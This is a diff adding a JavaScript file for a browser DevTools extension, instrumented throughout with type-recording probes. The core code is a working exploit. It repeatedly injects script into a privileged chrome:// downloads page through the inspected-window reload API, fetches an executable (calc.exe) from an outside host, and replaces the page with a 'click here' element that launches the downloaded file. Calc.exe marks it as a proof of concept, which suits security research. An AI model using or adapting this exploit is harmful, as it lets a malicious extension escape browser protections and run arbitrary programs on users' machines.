@@ -1,0 +1,167 @@
+var Inst0 = 0;
+var Inst1 = 0;
+var Inst2 = 0;
+var Inst3 = 0;
+var Inst4 = 0;
+var Inst5 = 0;
+var Inst6 = 0;
+var Inst7 = 0;
+var Inst8 = 0;
+var Inst9 = 0;
+var Inst10 = 0;
+var Inst11 = 0;
+var Inst12 = 0;
+var Inst13 = 0;
+var Inst14 = 0;
+var Inst15 = 0;
+var Inst16 = 0;
+var Inst17 = 0;
+var Inst18 = 0;
+var Inst19 = 0;
+var Inst20 = 0;
+var Inst21 = 0;
+var Inst22 = 0;
+var Inst23 = 0;
+var Inst24 = 0;
+var Inst25 = 0;
+var Inst26 = 0;
+var Inst27 = 0;
+var Inst28 = 0;
+var Inst29 = 0;
+var Inst30 = 0;
+var Inst31 = 0;
+var Inst32 = 0;
+var Inst33 = 0;
+var Inst34 = 0;
+var Inst35 = 0;
+var Inst36 = 0;
+var Inst37 = 0;
+var Inst38 = 0;
+var Inst39 = 0;
+var Inst40 = 0;
+var Inst41 = 0;
+ 
+function _TypeOfArray(a) {
+	let number = true;	
+	let string = true;
+	for (let i = 0; i < a.length; i++) {
+		if (number && (typeof a[i]) != "number") {
+			number = false;	
+		}
+		if (string && (typeof a[i]) != "string") {
+			string = false;	
+		}
+		if (!number && !string)
+			break;
+	}
+	if (number)
+		return "number";
+	else if (string)
+		return "string";
+	else
+		return "any";
+}
+
+function _TypeIsEqual(t1, t2) {
+	return JSON.stringify(t1) === JSON.stringify(t2);
+}
+
+function _TypeOf(a, step) {
+	var t;
+	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
+	if (type == "array") {
+		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
+	} else if (type == "object") {
+		let shape = [];
+        if (step === undefined || step > 0) {
+            let keys = Object.keys(a);
+            let length = Math.min(100, keys.length);
+		    for (let i = 0; i < length; i++) {
+			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
+		    }
+        }
+		t = {type : type, extra: {shape: shape}};
+	} else {
+		t = {type : type};
+	} 
+	return t;
+}
+
+function _RecordType(loc, a) {
+	var t = _TypeOf(a);
+    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
+}
+//function which injects the content script into the inspected page
+try { if (Inst0 <= 1000 && typeof (inject_script) != "undefined") {_RecordType("<78,91,2>",(inject_script)); Inst0++; } } catch(e) {}
+function inject_script() {
+try { if (Inst1 <= 1000 && typeof (chrome.devtools.inspectedWindow.reload) != "undefined") {_RecordType("<99,137,3>",(chrome.devtools.inspectedWindow.reload)); Inst1++; } } catch(e) {}try { if (Inst2 <= 1000 && typeof (chrome.devtools.inspectedWindow) != "undefined") {_RecordType("<99,130,3>",(chrome.devtools.inspectedWindow)); Inst2++; } } catch(e) {}try { if (Inst3 <= 1000 && typeof (chrome.devtools) != "undefined") {_RecordType("<99,114,3>",(chrome.devtools)); Inst3++; } } catch(e) {}try { if (Inst4 <= 1000 && typeof (chrome) != "undefined") {_RecordType("<99,105,3>",(chrome)); Inst4++; } } catch(e) {}
+  chrome.devtools.inspectedWindow.reload({"injectedScript": `
+    (async () => {
+      //check the origin, this script won't do anything on a non chrome page
+      console.log(origin);
+      if (!origin.startsWith("chrome://")) return;
+      
+      let dl = await import("chrome://downloads/downloads.js");
+      let url = "https://ia802803.us.archive.org/13/items/calc_exe_windows_xp/calc.exe";
+      open(url);
+
+      await new Promise((resolve) => {setTimeout(resolve, 1000)});
+      let downloads_manager = document.getElementsByTagName("downloads-manager")[0];
+      let first_item = downloads_manager.items_[0];
+
+      let div = document.createElement("div");
+      div.style.width = div.style.height = "100%";
+      div.textContent = "click here";
+      div.onclick = () => {
+        downloads_manager.mojoHandler_.openFileRequiringGesture(first_item.id);
+      }
+      document.body.replaceWith(div);
+    })()`
+  });
+}
+
+//interval to keep trying to inject the content script
+//there's a tiny window of time in which the content script will be
+//injected into a protected page, so this needs to run frequently
+try { if (Inst5 <= 1000 && typeof (start_interval) != "undefined") {_RecordType("<1251,1265,31>",(start_interval)); Inst5++; } } catch(e) {}
+function start_interval() {
+try { if (Inst6 <= 1000 && typeof (setInterval) != "undefined") {_RecordType("<1273,1284,32>",(setInterval)); Inst6++; } } catch(e) {}
+  setInterval(() => {
+    for (let i=0; i<5; i++) {
+try { if (Inst7 <= 1000 && typeof (i) != "undefined") {_RecordType("<1307,1308,33>",(i)); Inst7++; } } catch(e) {}try { if (Inst8 <= 1000 && typeof (i) != "undefined") {_RecordType("<1312,1313,33>",(i)); Inst8++; } } catch(e) {}try { if (Inst9 <= 1000 && typeof (i) != "undefined") {_RecordType("<1317,1318,33>",(i)); Inst9++; } } catch(e) {}
+try { if (Inst10 <= 1000 && typeof (inject_script) != "undefined") {_RecordType("<1331,1344,34>",(inject_script)); Inst10++; } } catch(e) {}
+      inject_script();
+    }
+  }, 0);  
+}
+
+try { if (Inst11 <= 1000 && typeof (main) != "undefined") {_RecordType("<1388,1392,39>",(main)); Inst11++; } } catch(e) {}
+async function main() {
+  //start the interval to inject the content script
+try { if (Inst12 <= 1000 && typeof (start_interval) != "undefined") {_RecordType("<1453,1467,41>",(start_interval)); Inst12++; } } catch(e) {}
+  start_interval();
+
+  //navigate the inspected page to chrome://policy
+try { if (Inst14 <= 1000 && typeof (chrome.tabs.get) != "undefined") {_RecordType("<1544,1559,44>",(chrome.tabs.get)); Inst14++; } } catch(e) {}try { if (Inst15 <= 1000 && typeof (chrome.tabs) != "undefined") {_RecordType("<1544,1555,44>",(chrome.tabs)); Inst15++; } } catch(e) {}try { if (Inst16 <= 1000 && typeof (chrome) != "undefined") {_RecordType("<1544,1550,44>",(chrome)); Inst16++; } } catch(e) {}try { if (Inst17 <= 1000 && typeof (chrome.devtools.inspectedWindow.tabId) != "undefined") {_RecordType("<1560,1597,44>",(chrome.devtools.inspectedWindow.tabId)); Inst17++; } } catch(e) {}try { if (Inst18 <= 1000 && typeof (chrome.devtools.inspectedWindow) != "undefined") {_RecordType("<1560,1591,44>",(chrome.devtools.inspectedWindow)); Inst18++; } } catch(e) {}try { if (Inst19 <= 1000 && typeof (chrome.devtools) != "undefined") {_RecordType("<1560,1575,44>",(chrome.devtools)); Inst19++; } } catch(e) {}try { if (Inst20 <= 1000 && typeof (chrome) != "undefined") {_RecordType("<1560,1566,44>",(chrome)); Inst20++; } } catch(e) {}
+  let tab = await chrome.tabs.get(chrome.devtools.inspectedWindow.tabId);
+try { if (Inst13 <= 1000 && typeof (tab) != "undefined") {_RecordType("<1532,1535,44>",(tab)); Inst13++; } } catch(e) {}
+try { if (Inst21 <= 1000 && typeof (chrome.tabs.update) != "undefined") {_RecordType("<1609,1627,45>",(chrome.tabs.update)); Inst21++; } } catch(e) {}try { if (Inst22 <= 1000 && typeof (chrome.tabs) != "undefined") {_RecordType("<1609,1620,45>",(chrome.tabs)); Inst22++; } } catch(e) {}try { if (Inst23 <= 1000 && typeof (chrome) != "undefined") {_RecordType("<1609,1615,45>",(chrome)); Inst23++; } } catch(e) {}try { if (Inst24 <= 1000 && typeof (tab.id) != "undefined") {_RecordType("<1628,1634,45>",(tab.id)); Inst24++; } } catch(e) {}try { if (Inst25 <= 1000 && typeof (tab) != "undefined") {_RecordType("<1628,1631,45>",(tab)); Inst25++; } } catch(e) {}
+  await chrome.tabs.update(tab.id, {url: "chrome://downloads"});
+  
+  //if this times out we need to retry or abort
+try { if (Inst26 <= 1000 && typeof (Promise) != "undefined") {_RecordType("<1732,1739,48>",(Promise)); Inst26++; } } catch(e) {}try { if (Inst27 <= 1000 && typeof (resolve) != "undefined") {_RecordType("<1741,1748,48>",(resolve)); Inst27++; } } catch(e) {}try { if (Inst28 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<1754,1764,48>",(setTimeout)); Inst28++; } } catch(e) {}try { if (Inst29 <= 1000 && typeof (resolve) != "undefined") {_RecordType("<1765,1772,48>",(resolve)); Inst29++; } } catch(e) {}
+  await new Promise((resolve) => {setTimeout(resolve, 5000)});
+try { if (Inst31 <= 1000 && typeof (chrome.tabs.get) != "undefined") {_RecordType("<1806,1821,49>",(chrome.tabs.get)); Inst31++; } } catch(e) {}try { if (Inst32 <= 1000 && typeof (chrome.tabs) != "undefined") {_RecordType("<1806,1817,49>",(chrome.tabs)); Inst32++; } } catch(e) {}try { if (Inst33 <= 1000 && typeof (chrome) != "undefined") {_RecordType("<1806,1812,49>",(chrome)); Inst33++; } } catch(e) {}try { if (Inst34 <= 1000 && typeof (tab.id) != "undefined") {_RecordType("<1822,1828,49>",(tab.id)); Inst34++; } } catch(e) {}try { if (Inst35 <= 1000 && typeof (tab) != "undefined") {_RecordType("<1822,1825,49>",(tab)); Inst35++; } } catch(e) {}
+  let new_tab = await chrome.tabs.get(tab.id);
+try { if (Inst30 <= 1000 && typeof (new_tab) != "undefined") {_RecordType("<1790,1797,49>",(new_tab)); Inst30++; } } catch(e) {}
+
+  //we're still on the original page, so reload the extension frame to retry
+try { if (Inst36 <= 1000 && typeof (new_tab.url.startsWith) != "undefined") {_RecordType("<1919,1941,52>",(new_tab.url.startsWith)); Inst36++; } } catch(e) {}try { if (Inst37 <= 1000 && typeof (new_tab.url) != "undefined") {_RecordType("<1919,1930,52>",(new_tab.url)); Inst37++; } } catch(e) {}try { if (Inst38 <= 1000 && typeof (new_tab) != "undefined") {_RecordType("<1919,1926,52>",(new_tab)); Inst38++; } } catch(e) {}
+  if (!new_tab.url.startsWith("chrome://downloads")) {
+try { if (Inst39 <= 1000 && typeof (location.reload) != "undefined") {_RecordType("<1972,1987,53>",(location.reload)); Inst39++; } } catch(e) {}try { if (Inst40 <= 1000 && typeof (location) != "undefined") {_RecordType("<1972,1980,53>",(location)); Inst40++; } } catch(e) {}
+    location.reload();
+  }
+}
+
+try { if (Inst41 <= 1000 && typeof (main) != "undefined") {_RecordType("<2002,2006,57>",(main)); Inst41++; } } catch(e) {}
+main();
